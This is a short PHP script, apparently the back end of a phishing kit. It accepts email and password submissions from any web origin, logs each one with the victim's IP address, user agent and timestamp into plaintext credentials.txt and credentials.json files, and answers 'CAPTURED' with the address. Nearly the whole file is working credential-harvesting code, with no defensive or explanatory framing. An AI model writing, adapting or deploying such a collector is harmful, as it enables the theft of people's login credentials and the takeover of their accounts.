<?php
// Anti-debug headers
header('Content-Type: text/plain');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: *');

// Handle preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit(0);

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 100);
$email = $_POST['email'] ?? $_GET['email'] ?? '';
$password = $_POST['password'] ?? $_GET['password'] ?? '';
$time = date('Y-m-d H:i:s T');

if ($email) {
    // TEXT LOG
    $log = sprintf(
        "[%s] IP:%-15s | UA:%-50s | %s:%s\n",
        $time, $ip, $ua, $email, $password
    );
    
    // Write files (create directories if needed)
    @file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    // JSON LOG
    $json = json_encode([
        'time' => $time,
        'ip' => $ip,
        'ua' => $ua,
        'email' => $email,
        'password' => $password
    ]);
    @file_put_contents('credentials.json', $json . "\n", FILE_APPEND | LOCK_EX);
    
    echo "CAPTURED: $email";
} else {
    echo "NO_EMAIL";
}
?>